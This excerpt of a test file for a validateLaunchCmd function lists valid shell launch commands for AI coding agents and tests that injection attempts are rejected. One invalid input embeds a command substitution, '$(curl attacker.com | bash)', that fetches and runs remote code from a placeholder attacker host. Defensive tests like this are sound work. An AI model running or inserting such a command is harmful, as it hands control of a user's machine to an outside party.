...
describe("validateLaunchCmd", () => {
  describe("valid inputs — real commands from agent-setup.ts (issue #2052 regression)", () => {
    const agentLaunchCmds = [
      "source ~/.jelmaanrc 2>/dev/null; export PATH=$HOME/.claude/local/bin:$HOME/.local/bin:$HOME/.bun/bin:$PATH; claude",
      "source ~/.jelmaanrc 2>/dev/null; source ~/.zshrc 2>/dev/null; codex",
      "source ~/.jelmaanrc 2>/dev/null; export PATH=$HOME/.npm-global/bin:$HOME/.bun/bin:$HOME/.local/bin:$PATH; openclaw tui",
      "source ~/.jelmaanrc 2>/dev/null; source ~/.zshrc 2>/dev/null; opencode",
      "source ~/.jelmaanrc 2>/dev/null; source ~/.zshrc 2>/dev/null; kilocode",
      "source ~/.jelmaanrc 2>/dev/null; hermes",
      "claude",
      "aider",
    ];
  ...
  describe("invalid inputs — injection attempts", () => {
    it("should reject command substitution $()", () => {
      ...
      expect(() => validateLaunchCmd("source ~/.jelmaanrc 2>/dev/null; $(curl attacker.com | bash)")).toThrow(
